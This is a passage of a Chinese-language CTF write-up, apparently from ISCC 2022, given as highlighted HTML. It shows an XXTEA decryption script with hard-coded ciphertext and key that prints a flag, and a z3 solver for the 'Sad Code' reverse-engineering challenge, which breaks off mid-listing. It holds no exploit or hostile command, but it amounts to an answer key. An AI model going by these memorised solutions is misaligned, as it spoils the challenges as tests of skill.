<span class="line" data-line="18"><span style="color:#E1E4E8">			{  </span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">				y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[p</span><span style="color:#F97583">+</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">				z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[p] </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">			}  </span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">			y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">			z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">		}  </span></span>
<span class="line" data-line="25"><span style="color:#F97583">		while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">rounds);  </span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">	}  </span></span>
<span class="line" data-line="27"><span style="color:#F97583">	else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">&#x3C;</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">      /* Decoding Part */</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">	{  </span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">		n </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">		rounds </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 6</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 52</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">		sum </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rounds</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">DELTA;  </span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">		y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="33"><span style="color:#F97583">		do</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">		{  </span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">			e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (sum </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="36"><span style="color:#F97583">			for</span><span style="color:#E1E4E8"> (p</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">></span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">)  </span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">			{  </span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">				z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[p</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">				y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[p] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">			}  </span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">			z </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">			y </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> v</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">			sum </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> DELTA;  </span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">		}  </span></span>
<span class="line" data-line="45"><span style="color:#F97583">		while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">rounds);  </span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">	}  </span></span>
<span class="line" data-line="47"><span style="color:#E1E4E8">}  </span></span>
<span class="line" data-line="48"></span></code></pre>
<p>编写解密脚本即可</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="cpp"><code><span class="line" data-line="1"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="2"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdint.h></span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="3"><span style="color:#F97583">#define</span><span style="color:#B392F0"> DELTA</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">9e3779b9</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="4"><span style="color:#F97583">#define</span><span style="color:#B392F0"> MX</span><span style="color:#E1E4E8"> (((z</span><span style="color:#F97583">>></span><span style="color:#79B8FF">5</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">y</span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (y</span><span style="color:#F97583">>></span><span style="color:#79B8FF">3</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">z</span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> ((sum</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">y) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (key[(p</span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">^</span><span style="color:#E1E4E8">e] </span><span style="color:#F97583">^</span><span style="color:#E1E4E8"> z)))  </span></span>
<span class="line" data-line="5"></span>
<span class="line" data-line="6"><span style="color:#F97583">void</span><span style="color:#B392F0"> btea</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int32_t</span><span style="color:#F97583"> *</span><span style="color:#FFAB70">v</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int</span><span style="color:#FFAB70"> n</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">int32_t</span><span style="color:#F97583"> const</span><span style="color:#FFAB70"> key</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">])  </span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">{  </span></span>
<span class="line" data-line="8"><span style="color:#F97583">	int32_t</span><span style="color:#E1E4E8"> y, z, sum;  </span></span>
<span class="line" data-line="9"><span style="color:#F97583">	signed</span><span style="color:#E1E4E8"> p, rounds, e;  </span></span>
<span class="line" data-line="10"><span style="color:#F97583">	if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">            /* Coding Part */</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">	{  </span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">		rounds </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 6</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 52</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">		sum </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">		z </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="15"><span style="color:#F97583">		do</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">		{  </span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">			sum </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> DELTA;  </span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">			e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (sum </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="19"><span style="color:#F97583">			for</span><span style="color:#E1E4E8"> (p</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)  </span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">			{  </span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">				y </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[p</span><span style="color:#F97583">+</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">				z </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[p] </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">			}  </span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">			y </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">			z </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">		}  </span></span>
<span class="line" data-line="27"><span style="color:#F97583">		while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">rounds);  </span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">	}  </span></span>
<span class="line" data-line="29"><span style="color:#F97583">	else</span><span style="color:#F97583"> if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">&#x3C;</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">      /* Decoding Part */</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">	{  </span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">		n </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">		rounds </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 6</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 52</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">n;  </span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">		sum </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rounds</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">DELTA;  </span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">		y </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="35"><span style="color:#F97583">		do</span><span style="color:#E1E4E8">  </span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">		{  </span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">			e </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (sum </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="38"><span style="color:#F97583">			for</span><span style="color:#E1E4E8"> (p</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">></span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">; p</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">)  </span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">			{  </span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">				z </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[p</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">				y </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[p] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">			}  </span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">			z </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[n</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];  </span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">			y </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> MX;  </span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">			sum </span><span style="color:#F97583">-=</span><span style="color:#E1E4E8"> DELTA;  </span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">		}  </span></span>
<span class="line" data-line="47"><span style="color:#F97583">		while</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">rounds);  </span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">	}  </span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">}  </span></span>
<span class="line" data-line="50"></span>
<span class="line" data-line="51"></span>
<span class="line" data-line="52"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">()  </span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">{  </span></span>
<span class="line" data-line="54"><span style="color:#F97583">	int32_t</span><span style="color:#E1E4E8"> v[</span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">];</span></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 2083504789</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="56"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 863817516</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1246907673</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="58"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 861360817</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1944023979</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="60"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 71509067</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">305568114</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="62"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1203113234</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="63"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 39999966</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="64"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1408413502</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">797353570</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="66"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">84516483</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1904288836</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1737869011</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 492860697</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="70"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">15</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 2091909920</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="71"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1335943054</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="72"><span style="color:#E1E4E8">	v[</span><span style="color:#79B8FF">17</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 125072142</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="73"><span style="color:#F97583">	int32_t</span><span style="color:#F97583"> const</span><span style="color:#E1E4E8"> k[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">49</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">53</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">43</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">43</span><span style="color:#E1E4E8">};  </span></span>
<span class="line" data-line="74"><span style="color:#F97583">	int</span><span style="color:#E1E4E8"> n</span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 18</span><span style="color:#E1E4E8">; </span></span>
<span class="line" data-line="75"><span style="color:#6A737D">    // n的绝对值表示v的长度，取正表示加密，取负表示解密  </span></span>
<span class="line" data-line="76"><span style="color:#6A737D">	// v为要加密的数据是两个32位无符号整数  </span></span>
<span class="line" data-line="77"><span style="color:#6A737D">	// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位    </span></span>
<span class="line" data-line="78"><span style="color:#B392F0">	btea</span><span style="color:#E1E4E8">(v, </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">n, k);  </span></span>
<span class="line" data-line="79"><span style="color:#B392F0">	printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"解密后的数据：</span><span style="color:#79B8FF">%u</span><span style="color:#79B8FF"> %u\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,v[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">],v[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]); </span></span>
<span class="line" data-line="80"><span style="color:#F97583">	for</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">;i</span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">;i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">){</span></span>
<span class="line" data-line="81"><span style="color:#B392F0">		printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%c</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,v[i]);</span></span>
<span class="line" data-line="82"><span style="color:#E1E4E8">	} </span></span>
<span class="line" data-line="83"><span style="color:#F97583">	return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;  </span></span>
<span class="line" data-line="84"><span style="color:#E1E4E8">}</span></span></code></pre>
<h3 id="sad-code">Sad Code</h3>
<blockquote>
<p>就是喜欢做题，你喜欢做数学题吗？</p>
</blockquote>
<p><code>ida x32</code> 打开，定位到 <code>_main_0</code> ，<code>F5</code> 查看伪代码。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220507141728609.png" alt="image-20220507141728609"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> z3 </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="2"><span style="color:#6A737D">#报错的装Z3-solver 不要用z3</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">v16</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[Int(</span><span style="color:#9ECBFF">"v16</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#F97583">%</span><span style="color:#E1E4E8">i) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)]</span></span>
<span class="line" data-line="4"></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">s</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">Solver()</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">s.add(v16[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 7</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">1F675FCBE</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">5</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 3</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">16ECB525D</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 8</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 10</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 5</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">48AD213F9</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">7</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 15</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 3</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">7AB246ADD</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">15</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 35</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">EE83D143C</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">s.add(</span><span style="color:#79B8FF">38</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> v16[</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">24FA58FB1</span><span style="color:#E1E4E8">)</span></span>
